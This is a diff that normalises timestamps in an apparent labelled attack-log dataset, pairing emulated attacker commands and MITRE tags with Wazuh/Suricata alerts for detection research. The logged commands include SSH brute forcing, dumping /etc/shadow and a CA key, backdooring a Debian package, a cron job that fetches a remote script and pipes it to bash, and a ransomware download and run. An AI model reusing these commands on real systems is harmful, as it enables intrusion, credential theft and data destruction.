@@ -9,7 +9,7 @@
     {
       "raw_id": "EVT-1001",
       "seq": "3_ssh_apt-1",
-      "timestamp": "2025-12-12T10:28:22.693190",
+      "timestamp": "2025-12-12T10:28:22.693190+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-1/attacker/logs/attackmate.json",
       "command": "hydra -C user_pass_combo.txt -s 10022 fw.attackbed.com ssh",
@@ -17,7 +17,7 @@
       "techniques": "T1078.002,T1110.001,T1133",
       "technique_name": "Valid Accounts: Local Accounts, Brute Force: Password Guessing, External Remote Services",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:28:22.693190",
+        "start-datetime": "2025-12-12T10:28:22.693190+00:00",
         "type": "shell",
         "cmd": "hydra -C user_pass_combo.txt -s 10022 fw.attackbed.com ssh",
         "parameters": {
@@ -49,7 +49,7 @@
     {
       "raw_id": "EVT-1002",
       "seq": "3_ssh_apt-1",
-      "timestamp": "2025-12-12T10:28:23.483+0000",
+      "timestamp": "2025-12-12T10:28:23.483000+00:00",
       "source_type": "wazuh",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-1/wazuh/logs/alerts/alerts.json",
       "rule_id": "86601",
@@ -58,7 +58,7 @@
       "src_ip": "192.42.1.174",
       "dst_ip": "10.12.0.223",
       "raw_json": {
-        "timestamp": "2025-12-12T10:28:23.483+0000",
+        "timestamp": "2025-12-12T10:28:23.483000+00:00",
         "rule": {
           "level": 3,
           "description": "Suricata: Alert - ET SCAN Potential SSH Scan",
@@ -130,7 +130,7 @@
     {
       "raw_id": "EVT-1003",
       "seq": "3_ssh_apt-1",
-      "timestamp": "2025-12-12T10:28:23.483+0000",
+      "timestamp": "2025-12-12T10:28:23.483000+00:00",
       "source_type": "wazuh",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-1/wazuh/logs/alerts/alerts.json",
       "rule_id": "86601",
@@ -139,7 +139,7 @@
       "src_ip": "192.42.1.174",
       "dst_ip": "10.12.0.223",
       "raw_json": {
-        "timestamp": "2025-12-12T10:28:23.483+0000",
+        "timestamp": "2025-12-12T10:28:23.483000+00:00",
         "rule": {
           "level": 3,
           "description": "Suricata: Alert - SURICATA Applayer Detect protocol only one direction",
@@ -213,7 +213,7 @@
     {
       "raw_id": "EVT-1004",
       "seq": "3_ssh_apt-1",
-      "timestamp": "2025-12-12T10:28:25.489+0000",
+      "timestamp": "2025-12-12T10:28:25.489000+00:00",
       "source_type": "wazuh",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-1/wazuh/logs/alerts/alerts.json",
       "rule_id": "86601",
@@ -222,7 +222,7 @@
       "src_ip": "192.42.1.174",
       "dst_ip": "10.12.0.223",
       "raw_json": {
-        "timestamp": "2025-12-12T10:28:25.489+0000",
+        "timestamp": "2025-12-12T10:28:25.489000+00:00",
         "rule": {
           "level": 3,
           "description": "Suricata: Alert - SURICATA Applayer Detect protocol only one direction",
@@ -296,7 +296,7 @@
     {
       "raw_id": "EVT-1005",
       "seq": "3_ssh_apt-1_2",
-      "timestamp": "2025-12-12T10:28:43.802248",
+      "timestamp": "2025-12-12T10:28:43.802248+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-1_2/attacker/logs/attackmate.json",
       "command": "id",
@@ -304,7 +304,7 @@
       "techniques": "T1078.002",
       "technique_name": "Valid Accounts: Local Accounts",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:28:43.802248",
+        "start-datetime": "2025-12-12T10:28:43.802248+00:00",
         "type": "ssh",
         "cmd": "id",
         "parameters": {
@@ -350,7 +350,7 @@
     {
       "raw_id": "EVT-1006",
       "seq": "3_ssh_apt-3",
-      "timestamp": "2025-12-12T10:28:59.926744",
+      "timestamp": "2025-12-12T10:28:59.926744+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-3/attacker/logs/attackmate.json",
       "command": "tcpdump -A port 21\n",
@@ -358,7 +358,7 @@
       "techniques": "T1040",
       "technique_name": "Network Sniffing",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:28:59.926744",
+        "start-datetime": "2025-12-12T10:28:59.926744+00:00",
         "type": "ssh",
         "cmd": "tcpdump -A port 21\n",
         "parameters": {
@@ -404,7 +404,7 @@
     {
       "raw_id": "EVT-1008",
       "seq": "3_ssh_apt-4_5",
-      "timestamp": "2025-12-12T10:29:50.037143",
+      "timestamp": "2025-12-12T10:29:50.037143+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-4_5/attacker/logs/attackmate.json",
       "command": "sudo -i\n",
@@ -412,7 +412,7 @@
       "techniques": "T1078.003",
       "technique_name": "Valid Accounts: Local Accounts",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:29:50.037143",
+        "start-datetime": "2025-12-12T10:29:50.037143+00:00",
         "type": "ssh",
         "cmd": "sudo -i\n",
         "parameters": {
@@ -458,7 +458,7 @@
     {
       "raw_id": "EVT-1009",
       "seq": "3_ssh_apt-4_5",
-      "timestamp": "2025-12-12T10:30:05.044203",
+      "timestamp": "2025-12-12T10:30:05.044203+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-4_5/attacker/logs/attackmate.json",
       "command": "rambo\n",
@@ -466,7 +466,7 @@
       "techniques": "T1078.003",
       "technique_name": "Valid Accounts: Local Accounts",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:30:05.044203",
+        "start-datetime": "2025-12-12T10:30:05.044203+00:00",
         "type": "ssh",
         "cmd": "rambo\n",
         "parameters": {
@@ -512,7 +512,7 @@
     {
       "raw_id": "EVT-1010",
       "seq": "3_ssh_apt-6",
-      "timestamp": "2025-12-12T10:30:35.052241",
+      "timestamp": "2025-12-12T10:30:35.052241+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-6/attacker/logs/attackmate.json",
       "command": "cat /etc/shadow\n",
@@ -520,7 +520,7 @@
       "techniques": "T1003.008",
       "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:30:35.052241",
+        "start-datetime": "2025-12-12T10:30:35.052241+00:00",
         "type": "ssh",
         "cmd": "cat /etc/shadow\n",
         "parameters": {
@@ -566,7 +566,7 @@
     {
       "raw_id": "EVT-1011",
       "seq": "3_ssh_apt-7",
-      "timestamp": "2025-12-12T10:30:50.058127",
+      "timestamp": "2025-12-12T10:30:50.058127+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-7/attacker/logs/attackmate.json",
       "command": "cat /etc/puppetlabs/puppetserver/ca/ca_key.pem\n",
@@ -574,7 +574,7 @@
       "techniques": "T1213",
       "technique_name": "Data from Information Repositories",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:30:50.058127",
+        "start-datetime": "2025-12-12T10:30:50.058127+00:00",
         "type": "ssh",
         "cmd": "cat /etc/puppetlabs/puppetserver/ca/ca_key.pem\n",
         "parameters": {
@@ -620,7 +620,7 @@
     {
       "raw_id": "EVT-1012",
       "seq": "3_ssh_apt-8",
-      "timestamp": "2025-12-12T10:31:05.062878",
+      "timestamp": "2025-12-12T10:31:05.062878+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-8/attacker/logs/attackmate.json",
       "command": "cat /media/share/healthcheck_cron.sh\n",
@@ -628,7 +628,7 @@
       "techniques": "T1039",
       "technique_name": "Data from Network Shared Drive",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:31:05.062878",
+        "start-datetime": "2025-12-12T10:31:05.062878+00:00",
         "type": "ssh",
         "cmd": "cat /media/share/healthcheck_cron.sh\n",
         "parameters": {
@@ -674,7 +674,7 @@
     {
       "raw_id": "EVT-1013",
       "seq": "3_ssh_apt-9",
-      "timestamp": "2025-12-12T10:32:30.613553",
+      "timestamp": "2025-12-12T10:32:30.613553+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-9/attacker/logs/attackmate.json",
       "command": "ls -l /var/www/html/debian\n",
@@ -682,7 +682,7 @@
       "techniques": "T1083",
       "technique_name": "File and Directory Discovery",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:32:30.613553",
+        "start-datetime": "2025-12-12T10:32:30.613553+00:00",
         "type": "ssh",
         "cmd": "ls -l /var/www/html/debian\n",
         "parameters": {
@@ -728,7 +728,7 @@
     {
       "raw_id": "EVT-1014",
       "seq": "3_ssh_apt-10",
-      "timestamp": "2025-12-12T10:32:45.621796",
+      "timestamp": "2025-12-12T10:32:45.621796+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-10/attacker/logs/attackmate.json",
       "command": "apt update && apt install -y dpkg-dev\n",
@@ -736,7 +736,7 @@
       "techniques": "T1059.004",
       "technique_name": "Command and Scripting Interpreter: Unix Shell",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:32:45.621796",
+        "start-datetime": "2025-12-12T10:32:45.621796+00:00",
         "type": "ssh",
         "cmd": "apt update && apt install -y dpkg-dev\n",
         "parameters": {
@@ -782,7 +782,7 @@
     {
       "raw_id": "EVT-1016",
       "seq": "3_ssh_apt-10",
-      "timestamp": "2025-12-12T10:32:45.741+0000",
+      "timestamp": "2025-12-12T10:32:45.741000+00:00",
       "source_type": "wazuh",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-10/wazuh/logs/alerts/alerts.json",
       "rule_id": "86601",
@@ -791,7 +791,7 @@
       "src_ip": "192.42.1.174",
       "dst_ip": "10.12.0.223",
       "raw_json": {
-        "timestamp": "2025-12-12T10:32:45.741+0000",
+        "timestamp": "2025-12-12T10:32:45.741000+00:00",
         "rule": {
           "level": 3,
           "description": "Suricata: Alert - ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
@@ -874,7 +874,7 @@
     {
       "raw_id": "EVT-1017",
       "seq": "3_ssh_apt-10",
-      "timestamp": "2025-12-12T10:32:45.746+0000",
+      "timestamp": "2025-12-12T10:32:45.746000+00:00",
       "source_type": "wazuh",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-10/wazuh/logs/alerts/alerts.json",
       "rule_id": "86601",
@@ -883,7 +883,7 @@
       "src_ip": "192.42.1.174",
       "dst_ip": "10.12.0.223",
       "raw_json": {
-        "timestamp": "2025-12-12T10:32:45.746+0000",
+        "timestamp": "2025-12-12T10:32:45.746000+00:00",
         "rule": {
           "level": 3,
           "description": "Suricata: Alert - ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
@@ -966,7 +966,7 @@
     {
       "raw_id": "EVT-1018",
       "seq": "3_ssh_apt-10",
-      "timestamp": "2025-12-12T10:32:47.692+0000",
+      "timestamp": "2025-12-12T10:32:47.692000+00:00",
       "source_type": "wazuh",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-10/wazuh/logs/alerts/alerts.json",
       "rule_id": "86601",
@@ -975,7 +975,7 @@
       "src_ip": "192.42.1.174",
       "dst_ip": "10.12.0.223",
       "raw_json": {
-        "timestamp": "2025-12-12T10:32:47.692+0000",
+        "timestamp": "2025-12-12T10:32:47.692000+00:00",
         "rule": {
           "level": 3,
           "description": "Suricata: Alert - ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
@@ -1058,7 +1058,7 @@
     {
       "raw_id": "EVT-1019",
       "seq": "3_ssh_apt-10",
-      "timestamp": "2025-12-12T10:32:47.696+0000",
+      "timestamp": "2025-12-12T10:32:47.696000+00:00",
       "source_type": "wazuh",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-10/wazuh/logs/alerts/alerts.json",
       "rule_id": "86601",
@@ -1067,7 +1067,7 @@
       "src_ip": "192.42.1.174",
       "dst_ip": "10.12.0.223",
       "raw_json": {
-        "timestamp": "2025-12-12T10:32:47.696+0000",
+        "timestamp": "2025-12-12T10:32:47.696000+00:00",
         "rule": {
           "level": 3,
           "description": "Suricata: Alert - ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
@@ -1150,7 +1150,7 @@
     {
       "raw_id": "EVT-1020",
       "seq": "3_ssh_apt-10",
-      "timestamp": "2025-12-12T10:32:47.700+0000",
+      "timestamp": "2025-12-12T10:32:47.700000+00:00",
       "source_type": "wazuh",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-10/wazuh/logs/alerts/alerts.json",
       "rule_id": "86601",
@@ -1159,7 +1159,7 @@
       "src_ip": "192.42.1.174",
       "dst_ip": "10.12.0.223",
       "raw_json": {
-        "timestamp": "2025-12-12T10:32:47.700+0000",
+        "timestamp": "2025-12-12T10:32:47.700000+00:00",
         "rule": {
           "level": 3,
           "description": "Suricata: Alert - ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
@@ -1242,7 +1242,7 @@
     {
       "raw_id": "EVT-1021",
       "seq": "3_ssh_apt-11",
-      "timestamp": "2025-12-12T10:33:20.630661",
+      "timestamp": "2025-12-12T10:33:20.630661+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-11/attacker/logs/attackmate.json",
       "command": "mkdir /tmp/.tmux_data\n",
@@ -1250,7 +1250,7 @@
       "techniques": "T1036.005,T1564.001 ",
       "technique_name": "Masquerading: Match Legitimate Name or Location,Hide Artifacts: Hidden Files and Directories",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:33:20.630661",
+        "start-datetime": "2025-12-12T10:33:20.630661+00:00",
         "type": "ssh",
         "cmd": "mkdir /tmp/.tmux_data\n",
         "parameters": {
@@ -1296,7 +1296,7 @@
     {
       "raw_id": "EVT-1022",
       "seq": "3_ssh_apt-12_13_14",
-      "timestamp": "2025-12-12T10:33:50.640719",
+      "timestamp": "2025-12-12T10:33:50.640719+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-12_13_14/attacker/logs/attackmate.json",
       "command": "dpkg-deb -R /var/www/html/debian/healthcheckd_1.0-1_amd64.deb healthcheckd\n",
@@ -1304,7 +1304,7 @@
       "techniques": "T1574",
       "technique_name": "Hijack Execution Flow",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:33:50.640719",
+        "start-datetime": "2025-12-12T10:33:50.640719+00:00",
         "type": "ssh",
         "cmd": "dpkg-deb -R /var/www/html/debian/healthcheckd_1.0-1_amd64.deb healthcheckd\n",
         "parameters": {
@@ -1350,7 +1350,7 @@
     {
       "raw_id": "EVT-1023",
       "seq": "3_ssh_apt-12_13_14",
-      "timestamp": "2025-12-12T10:34:35.650525",
+      "timestamp": "2025-12-12T10:34:35.650525+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-12_13_14/attacker/logs/attackmate.json",
       "command": ":%s/1.0-1/1.0-2/g\n",
@@ -1358,7 +1358,7 @@
       "techniques": "T1059,T1574",
       "technique_name": "Command and Scripting Interpreter,Hijack Execution Flow",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:34:35.650525",
+        "start-datetime": "2025-12-12T10:34:35.650525+00:00",
         "type": "ssh",
         "cmd": ":%s/1.0-1/1.0-2/g\n",
         "parameters": {
@@ -1404,7 +1404,7 @@
     {
       "raw_id": "EVT-1024",
       "seq": "3_ssh_apt-12_13_14",
-      "timestamp": "2025-12-12T10:35:05.654988",
+      "timestamp": "2025-12-12T10:35:05.654988+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-12_13_14/attacker/logs/attackmate.json",
       "command": ":wq\n",
@@ -1412,7 +1412,7 @@
       "techniques": "T1059,T1574",
       "technique_name": "Command and Scripting Interpreter,Hijack Execution Flow",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:35:05.654988",
+        "start-datetime": "2025-12-12T10:35:05.654988+00:00",
         "type": "ssh",
         "cmd": ":wq\n",
         "parameters": {
@@ -1458,7 +1458,7 @@
     {
       "raw_id": "EVT-1025",
       "seq": "3_ssh_apt-15_16",
-      "timestamp": "2025-12-12T10:36:50.731411",
+      "timestamp": "2025-12-12T10:36:50.731411+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-15_16/attacker/logs/attackmate.json",
       "command": "echo '*/5 * * * * root /usr/bin/curl http://192.42.1.174:8888/install.sh | /bin/bash' > /etc/cron.d/health",
@@ -1466,7 +1466,7 @@
       "techniques": "T1053.003,T1105,T1071.001 ",
       "technique_name": "Scheduled Task/Job: Cron,Ingress Tool Transfer,Application Layer Protocol: Web Protocols ",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:36:50.731411",
+        "start-datetime": "2025-12-12T10:36:50.731411+00:00",
         "type": "ssh",
         "cmd": "echo '*/5 * * * * root /usr/bin/curl http://192.42.1.174:8888/install.sh | /bin/bash' > /etc/cron.d/health",
         "parameters": {
@@ -1512,7 +1512,7 @@
     {
       "raw_id": "EVT-1026",
       "seq": "3_ssh_apt-15_16",
-      "timestamp": "2025-12-12T10:37:50.743981",
+      "timestamp": "2025-12-12T10:37:50.743981+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-15_16/attacker/logs/attackmate.json",
       "command": ":wq\n",
@@ -1520,7 +1520,7 @@
       "techniques": "T1053.003,T1105,T1071.001 ",
       "technique_name": "Scheduled Task/Job: Cron,Ingress Tool Transfer,Application Layer Protocol: Web Protocols ",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:37:50.743981",
+        "start-datetime": "2025-12-12T10:37:50.743981+00:00",
         "type": "ssh",
         "cmd": ":wq\n",
         "parameters": {
@@ -1566,7 +1566,7 @@
     {
       "raw_id": "EVT-1027",
       "seq": "3_ssh_apt-17_18",
-      "timestamp": "2025-12-12T10:38:20.844715",
+      "timestamp": "2025-12-12T10:38:20.844715+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-17_18/attacker/logs/attackmate.json",
       "command": "dpkg-deb -b healthcheckd /var/www/html/debian/healthcheckd_1.0-2_amd64.deb\n",
@@ -1574,7 +1574,7 @@
       "techniques": "T1072",
       "technique_name": "Software Deployment Tools",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:38:20.844715",
+        "start-datetime": "2025-12-12T10:38:20.844715+00:00",
         "type": "ssh",
         "cmd": "dpkg-deb -b healthcheckd /var/www/html/debian/healthcheckd_1.0-2_amd64.deb\n",
         "parameters": {
@@ -1620,7 +1620,7 @@
     {
       "raw_id": "EVT-1028",
       "seq": "3_ssh_apt-17_18",
-      "timestamp": "2025-12-12T10:38:51.057214",
+      "timestamp": "2025-12-12T10:38:51.057214+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-17_18/attacker/logs/attackmate.json",
       "command": "dpkg-scanpackages . | gzip -c9  > Packages.gz\n",
@@ -1628,7 +1628,7 @@
       "techniques": "T1072",
       "technique_name": "Software Deployment Tools",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:38:51.057214",
+        "start-datetime": "2025-12-12T10:38:51.057214+00:00",
         "type": "ssh",
         "cmd": "dpkg-scanpackages . | gzip -c9  > Packages.gz\n",
         "parameters": {
@@ -1674,7 +1674,7 @@
     {
       "raw_id": "EVT-1029",
       "seq": "3_ssh_apt-17_18",
-      "timestamp": "2025-12-12T10:39:06.247325",
+      "timestamp": "2025-12-12T10:39:06.247325+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-17_18/attacker/logs/attackmate.json",
       "command": "ssh -i ~/.ssh/attacker_mgmt -o StrictHostKeyChecking=no -o \"ProxyCommand=ssh -i ~/.ssh/attacker_mgmt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -W %h:%p aecid@192.42.0.201\" aecid@10.12.0.223 'echo \"ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@192.168.100.23 '\\''apt update && apt install -y healthcheckd'\\''\" | at now + 2 minute'",
@@ -1682,7 +1682,7 @@
       "techniques": null,
       "technique_name": null,
       "raw_json": {
-        "start-datetime": "2025-12-12T10:39:06.247325",
+        "start-datetime": "2025-12-12T10:39:06.247325+00:00",
         "type": "shell",
         "cmd": "ssh -i ~/.ssh/attacker_mgmt -o StrictHostKeyChecking=no -o \"ProxyCommand=ssh -i ~/.ssh/attacker_mgmt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -W %h:%p aecid@192.42.0.201\" aecid@10.12.0.223 'echo \"ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@192.168.100.23 '\\''apt update && apt install -y healthcheckd'\\''\" | at now + 2 minute'",
         "parameters": {
@@ -1712,7 +1712,7 @@
     {
       "raw_id": "EVT-1031",
       "seq": "3_ssh_apt-17_18",
-      "timestamp": "2025-12-12T10:41:02.320+0000",
+      "timestamp": "2025-12-12T10:41:02.320000+00:00",
       "source_type": "wazuh",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-17_18/wazuh/logs/alerts/alerts.json",
       "rule_id": "86601",
@@ -1721,7 +1721,7 @@
       "src_ip": "192.42.1.174",
       "dst_ip": "10.12.0.223",
       "raw_json": {
-        "timestamp": "2025-12-12T10:41:02.320+0000",
+        "timestamp": "2025-12-12T10:41:02.320000+00:00",
         "rule": {
           "level": 3,
           "description": "Suricata: Alert - ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
@@ -1804,7 +1804,7 @@
     {
       "raw_id": "EVT-1032",
       "seq": "3_ssh_apt-19_20_21_22_23_24",
-      "timestamp": "2025-12-12T10:45:39.950733",
+      "timestamp": "2025-12-12T10:45:39.950733+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-19_20_21_22_23_24/attacker/logs/attackmate.json",
       "command": "shell",
@@ -1812,7 +1812,7 @@
       "techniques": "T1059",
       "technique_name": "Command and Scripting Interpreter",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:45:39.950733",
+        "start-datetime": "2025-12-12T10:45:39.950733+00:00",
         "type": "msf-session",
         "cmd": "shell",
         "parameters": {
@@ -1842,7 +1842,7 @@
     {
       "raw_id": "EVT-1033",
       "seq": "3_ssh_apt-19_20_21_22_23_24",
-      "timestamp": "2025-12-12T10:45:56.275887",
+      "timestamp": "2025-12-12T10:45:56.275887+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-19_20_21_22_23_24/attacker/logs/attackmate.json",
       "command": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";",
@@ -1850,7 +1850,7 @@
       "techniques": "T1059",
       "technique_name": "Command and Scripting Interpreter",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:45:56.275887",
+        "start-datetime": "2025-12-12T10:45:56.275887+00:00",
         "type": "msf-session",
         "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";",
         "parameters": {
@@ -1880,7 +1880,7 @@
     {
       "raw_id": "EVT-1034",
       "seq": "3_ssh_apt-19_20_21_22_23_24",
-      "timestamp": "2025-12-12T10:46:12.648064",
+      "timestamp": "2025-12-12T10:46:12.648064+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-19_20_21_22_23_24/attacker/logs/attackmate.json",
       "command": "export SHELL=bash",
@@ -1888,7 +1888,7 @@
       "techniques": "T1059",
       "technique_name": "Command and Scripting Interpreter",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:46:12.648064",
+        "start-datetime": "2025-12-12T10:46:12.648064+00:00",
         "type": "msf-session",
         "cmd": "export SHELL=bash",
         "parameters": {
@@ -1918,7 +1918,7 @@
     {
       "raw_id": "EVT-1035",
       "seq": "3_ssh_apt-19_20_21_22_23_24",
-      "timestamp": "2025-12-12T10:46:29.018547",
+      "timestamp": "2025-12-12T10:46:29.018547+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-19_20_21_22_23_24/attacker/logs/attackmate.json",
       "command": "export TERM=xterm256-color",
@@ -1926,7 +1926,7 @@
       "techniques": "T1059",
       "technique_name": "Command and Scripting Interpreter",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:46:29.018547",
+        "start-datetime": "2025-12-12T10:46:29.018547+00:00",
         "type": "msf-session",
         "cmd": "export TERM=xterm256-color",
         "parameters": {
@@ -1956,7 +1956,7 @@
     {
       "raw_id": "EVT-1036",
       "seq": "3_ssh_apt-19_20_21_22_23_24",
-      "timestamp": "2025-12-12T10:46:45.398399",
+      "timestamp": "2025-12-12T10:46:45.398399+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-19_20_21_22_23_24/attacker/logs/attackmate.json",
       "command": "stty rows 38 columns 116",
@@ -1964,7 +1964,7 @@
       "techniques": "T1059",
       "technique_name": "Command and Scripting Interpreter",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:46:45.398399",
+        "start-datetime": "2025-12-12T10:46:45.398399+00:00",
         "type": "msf-session",
         "cmd": "stty rows 38 columns 116",
         "parameters": {
@@ -1994,7 +1994,7 @@
     {
       "raw_id": "EVT-1037",
       "seq": "3_ssh_apt-19_20_21_22_23_24",
-      "timestamp": "2025-12-12T10:47:01.722170",
+      "timestamp": "2025-12-12T10:47:01.722170+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-19_20_21_22_23_24/attacker/logs/attackmate.json",
       "command": "export PS1=\"PWN >\"",
@@ -2002,7 +2002,7 @@
       "techniques": "T1059",
       "technique_name": "Command and Scripting Interpreter",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:47:01.722170",
+        "start-datetime": "2025-12-12T10:47:01.722170+00:00",
         "type": "msf-session",
         "cmd": "export PS1=\"PWN >\"",
         "parameters": {
@@ -2032,7 +2032,7 @@
     {
       "raw_id": "EVT-1038",
       "seq": "3_ssh_apt-25",
-      "timestamp": "2025-12-12T10:47:18.091378",
+      "timestamp": "2025-12-12T10:47:18.091378+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-25/attacker/logs/attackmate.json",
       "command": "curl http://192.42.1.174/donotcry > /opt/donotcry",
@@ -2040,7 +2040,7 @@
       "techniques": "T1486,T1105",
       "technique_name": "Data Encrypted for Impact, Ingress Tool Transfer",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:47:18.091378",
+        "start-datetime": "2025-12-12T10:47:18.091378+00:00",
         "type": "msf-session",
         "cmd": "curl http://192.42.1.174/donotcry > /opt/donotcry",
         "parameters": {
@@ -2070,7 +2070,7 @@
     {
       "raw_id": "EVT-1039",
       "seq": "3_ssh_apt-25",
-      "timestamp": "2025-12-12T10:47:18.399+0000",
+      "timestamp": "2025-12-12T10:47:18.399000+00:00",
       "source_type": "wazuh",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-25/wazuh/logs/alerts/alerts.json",
       "rule_id": "86601",
@@ -2079,7 +2079,7 @@
       "src_ip": "192.42.1.174",
       "dst_ip": "10.12.0.223",
       "raw_json": {
-        "timestamp": "2025-12-12T10:47:18.399+0000",
+        "timestamp": "2025-12-12T10:47:18.399000+00:00",
         "rule": {
           "level": 3,
           "description": "Suricata: Alert - ET HUNTING curl User-Agent to Dotted Quad",
@@ -2176,7 +2176,7 @@
     {
       "raw_id": "EVT-1040",
       "seq": "3_ssh_apt-25",
-      "timestamp": "2025-12-12T10:47:18.401+0000",
+      "timestamp": "2025-12-12T10:47:18.401000+00:00",
       "source_type": "wazuh",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-25/wazuh/logs/alerts/alerts.json",
       "rule_id": "86601",
@@ -2185,7 +2185,7 @@
       "src_ip": "192.42.1.174",
       "dst_ip": "10.12.0.223",
       "raw_json": {
-        "timestamp": "2025-12-12T10:47:18.401+0000",
+        "timestamp": "2025-12-12T10:47:18.401000+00:00",
         "rule": {
           "level": 3,
           "description": "Suricata: Alert - ET POLICY Executable and linking format (ELF) file download Over HTTP",
@@ -2285,7 +2285,7 @@
     {
       "raw_id": "EVT-1041",
       "seq": "3_ssh_apt-26",
-      "timestamp": "2025-12-12T10:47:34.463304",
+      "timestamp": "2025-12-12T10:47:34.463304+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-26/attacker/logs/attackmate.json",
       "command": "/lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images",
@@ -2293,7 +2293,7 @@
       "techniques": "T1486,T1565.001",
       "technique_name": "Data Encrypted for Impact, Data Manipulation: Stored Data Manipulation",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:47:34.463304",
+        "start-datetime": "2025-12-12T10:47:34.463304+00:00",
         "type": "msf-session",
         "cmd": "/lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images",
         "parameters": {
@@ -2323,7 +2323,7 @@
     {
       "raw_id": "EVT-1042",
       "seq": "3_ssh_apt-27",
-      "timestamp": "2025-12-12T10:47:50.850467",
+      "timestamp": "2025-12-12T10:47:50.850467+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-27/attacker/logs/attackmate.json",
       "command": "find /media/data/Images",
@@ -2331,7 +2331,7 @@
       "techniques": "T1018",
       "technique_name": "Remote System Discovery",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:47:50.850467",
+        "start-datetime": "2025-12-12T10:47:50.850467+00:00",
         "type": "msf-session",
         "cmd": "find /media/data/Images",
         "parameters": {
@@ -2361,7 +2361,7 @@
     {
       "raw_id": "EVT-1043",
       "seq": "3_ssh_apt-28",
-      "timestamp": "2025-12-12T10:48:07.171055",
+      "timestamp": "2025-12-12T10:48:07.171055+00:00",
       "source_type": "attackmate",
